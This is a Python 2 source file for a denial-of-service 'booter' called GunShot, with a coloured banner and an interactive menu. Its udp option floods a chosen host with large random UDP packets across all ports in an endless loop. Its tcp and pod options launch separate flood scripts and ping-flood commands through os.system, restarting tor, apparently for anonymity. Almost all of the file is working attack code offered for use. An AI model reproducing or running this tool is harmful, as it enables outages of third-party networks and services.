#!/usr/local/bin/python
# coding: latin-1
import socket
from time import sleep
from threading import Thread, active_count
from os  import *
import random
import string
import signal
import ssl	
import argparse
import sys
import sys
import os
import socket
import socks
import requests
import time
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
Gb = random._urandom(20000)
bytes = random._urandom(20000)
Kb = random._urandom(20000)


os.system("clear")

r = '\033[31m'
W = '\033[90m'
R = '\033[91m'
N = '\033[0m'
G = '\033[92m'
B = '\033[94m'
Y = '\033[93m'
LB = '\033[1;36m'
P = '\033[95m'
B = '\033[30m'
O = '\033[33m'

print Y+"started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)

banner = P+'''
	 ██████\033[92m╗ \033[95m██\033[92m╗\033[95m   ██\033[92m╗\033[95m███\033[92m╗\033[95m   ██\033[92m╗\033[95m▄▄███▄▄·██\033[92m╗\033[95m  ██\033[92m╗\033[95m ██████\033[92m╗\033[95m ████████\033[92m╗
	\033[95m██\033[92m╔════╝\033[95m ██\033[92m║\033[95m   ██\033[92m║\033[95m████\033[92m╗\033[95m  ██\033[92m║\033[95m██\033[92m╔════╝\033[95m██\033[92m║\033[95m  ██\033[92m║\033[95m██\033[92m╔═\033[95m████\033[92m╗╚══\033[95m██\033[92m╔══╝
	██║  ███╗██║   ██║██╔██╗ ██║███████╗███████║██║██╔██║   ██║   
	██║   ██║██║   ██║██║╚██╗██║╚════██║██╔══██║████╔╝██║   ██║   
	╚██████╔╝╚██████╔╝██║ ╚████║███████║██║  ██║╚██████╔╝   ██║   
	 \033[92m╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═▀▀▀══╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   
	created by\033[0m @unkn0wn_bali
'''

print P+(banner.decode('utf-8'))
print "\n"
print "\n"
found = False
while not found:
	booter = raw_input(G+"Gun\033[95m$h0t: \033[0m")

	if booter == "?" :
		print G+"""
***************************************************
        	  command help
***************************************************\033[0m
udp : type udp you'll understand what to do after

tcp : type tcp hit enter then do attack commands
      ex      (tcp.py www.eatmyass.com -p 80 -t 150)

pod : type pod hit enter then do attack commands
      ex (ping www.eatmyass.com -l 150)

warning : type warning says something important
***************************************************
		"""

	if booter == "tcp" :
		tcp = raw_input(G+"Gun\033[95m$h0t\033[95m/\033[92mtcp: \033[0m")
		os.system("cd attacks && chmod +x tcp.py")
		while True:
			os.system("clear")
			os.system("service tor restart")
			os.system("clear")
			os.system("cd attacks && python " + tcp)

	if booter == "clear" :
		os.system("clear")
		print O+(banner.decode('utf-8'))

	if booter == "udp" :
		target = raw_input(G+'\033[0mEnter Target: ')
		ip = socket.gethostbyname(target)
		port = input(G+'\033[0mEnter Port: ')
		os.system("service tor restart")
		print N+"udp attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
		os.system("sleep 2s")
		sent = 0
		print "KILLING %s CONNECTIONS"%(ip)						
		while True:
			os.system("clear")
			os.system("clear")
			sock.sendto(Gb, (ip,port))
			sock.sendto(bytes, (ip,port))
			sock.sendto(Kb, (ip,port))
			sent = sent + 1
			port = port + 1
			if port == 65534:
				port = 1

	if booter == R+"warning" :
		print """
		WARNING: WHEN YOU LAUNCH A
		ATTACK YOU STOP IT BY CLOSING
		OUT THE TERMINAL YOUR WELCOME
		"""

	if booter == "pod" :
		pod = raw_input(G+"Gun\033[95m$h0t\033[95m/\033[92mpod: \033[0m")
		while True:
			os.system("service tor restart")
			os.system("clear")
			os.system(pod)
found = True
